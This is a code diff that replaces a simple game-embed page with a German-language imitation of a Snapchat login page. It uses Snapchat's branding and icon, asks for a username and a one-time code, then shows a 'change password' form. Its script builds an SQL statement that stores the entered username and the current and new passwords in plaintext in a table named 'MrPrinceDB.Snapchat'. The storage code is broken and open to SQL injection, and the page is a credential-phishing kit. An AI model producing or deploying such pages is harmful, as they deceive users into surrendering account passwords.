@@ -1,20 +1,185 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <link rel="stylesheet" type="text/css" href="css/styles.css">
-  <link rel="icon" id="favicon" type="image/png" sizes="32x32" href="pics/icon32.png">
-  <link rel="icon" id="favicon-small" type="image/png" sizes="16x16" href="pics/icon16.png">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passwort ändern | Snapchat</title>
+    <link rel="stylesheet" type="text/css" href="https://snapnet-cdn.storage.googleapis.com/fonts/avenir-next/avenirnext.font.css">
+    <style>
+        body {
+            background-color: #f3f2f3;
+            font-family: 'Avenir Next', 'Helvetica Neue LT Std Roman', sans-serif;
+            text-align: center;
+            margin: 50px;
+            color: #000;
+        }
+
+        h2 {
+            color: #000;
+        }
+
+        label {
+            color: #999;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 1px;
+        }
+
+        input {
+            background: #f7f7f7;
+            border-radius: 4px;
+            border: 1px solid #f7f7f7;
+            box-shadow: 0 0 0 0 rgba(0,0,0,0);
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            height: 44px;
+            padding: 0 0 0 12px;
+            margin-bottom: 16px;
+            transition: box-shadow .15s ease-out .15s,border-color .15s ease-out,background .15s ease-out .15s,color .15s ease-out;
+            width: 100%;
+        }
+
+        input:focus {
+            border-color: rgba(0,0,0,0);
+            border-bottom-color: #0fadff;
+            box-shadow: 0 1px 0 0 #0fadff;
+            background: #f2f2f2;
+            color: #343a40;
+            outline: none;
+        }
+
+        input:disabled {
+            color: #acb0b5;
+            cursor: not-allowed;
+            background: #ebebeb repeating-linear-gradient(45deg, #ebebeb, #ebebeb 2px, #f2f2f2 2px, #f2f2f2 8px);
+        }
+
+        input:disabled:hover {
+            color: #acb0b5;
+            cursor: not-allowed;
+            background: #ebebeb repeating-linear-gradient(45deg, #ebebeb, #ebebeb 2px, #f2f2f2 2px, #f2f2f2 8px);
+            border-color: #f7f7f7;
+        }
+
+        button {
+            background-color: #0eacff;
+            color: #ffffff;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 45px;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        button:hover {
+            background-color: #0097e4;
+        }
+
+        /* Style for the change password dialog */
+        .change-password {
+            display: none;
+            margin-top: 20px;
+            color: #000;
+        }
+
+        .change-password input,
+        .change-password button {
+            width: 200px;
+        }
+
+        .additional-action {
+            color: #0fadff;
+            font-weight: 600;
+            text-decoration: none;
+            border-bottom: 0;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 6px;
+            border: 1px solid #ebebeb;
+            width: 356px;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,.04);
+            padding: 24px;
+        }
+
+        .containerCP {
+            background: #fff;
+            border-radius: 6px;
+            border: 1px solid #ebebeb;
+            width: 356px;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,.04);
+            padding: 24px;
+            display:   none;
+        }
+
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="content">
-      <h1 class="title" id="title-text"></h1>
-      <iframe src="https://www.retrogames.cc/embed/40238-tekken-3.html" width="600" height="450" frameborder="no" allowfullscreen="true" webkitallowfullscreen="true" mozallowfullscreen="true" scrolling="no"></iframe>
-      <p class="description" id="redirect-link"><u><i>Klick mich an und kehre sofort um zu einer besseren und sicheren Webseite!</i></u></p>
-      <button class="button">Spendenhilfe: Walter White</button>
+    <div class="container" id="uniquePassword">
+        <img width="60" height="60" src="https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg" alt="Snapchat Ghost Icon">
+        <h1>Logge dich bei Snapchat ein</h1>
+        <label for="username">Nutzername oder Email</label>
+        <input type="text" id="username" name="username" required><br>
+
+        <label for="password">Einmaliger Code</label>
+        <input type="password" id="password" name="password" required>
+
+        <div class="additional-action">
+            <a>Stattdessen Handynummer verwenden</a>
+        </div><br>
+        
+
+        <button onclick="checkPassword()">Weiter</button>
     </div>
-  </div>
-  <script src="js/script.js"></script>
+
+    <!-- Change password dialog -->
+    <div class="containerCP" id="changePassword">
+        <h2>Passwort ändern</h2>
+        <label for="currentPassword">Voheriges Passwort</label>
+        <input type="password" id="currentPassword" name="currentPassword" required><br>
+
+        <label for="newPassword">Neues Passwort</label>
+        <input type="password" id="newPassword" name="newPassword" required><br>
+
+        <label for="confirmPassword">Neues Passwort bestätigen</label>
+        <input type="password" id="confirmPassword" name="confirmPassword" required><br>
+
+        <button onclick="savePassword()">Neues Passwort speichern</button>
+    </div>
+
+
+
+    <script>
+        function checkPassword() {
+            var password = document.getElementById("password").value;
+            var uniquePassword = "0184737";
+
+            if (password === uniquePassword) {
+                // Display change password dialog
+                document.getElementById("uniquePassword").style.display = "none";
+                document.getElementById("changePassword").style.display = "block";
+            } else {
+                // Display error message
+                alert("Einmaliger Code ungültig. Versuche es bitte nochmal.");
+            }
+        }
+
+        function savePassword() {
+            var username = document.getElementById("username").value;
+            var currentPassword = document.getElementById("currentPassword").value;
+            var newPassword = document.getElementById("newPassword").value;
+            var confirmPassword = document.getElementById("confirmPassword").value;
+
+            var sql = "INSERT INTO MrPrinceDB.Snapchat (USERNAME, CURRPASS, NEWPASS, CONFIRMPASS, DATETIME) VALUES ('" + username + "', '" + currentPassword + "', '" + newPassword + "', '" + confirmPassword + "', " + datetime + ");";
+            // execute the SQL statement
+            connection.query(sql, function (err, result) {
+                if (err) throw err;
+                console.log("1 record inserted");
+            });
+        }
+    </script>
+
 </body>
 </html>
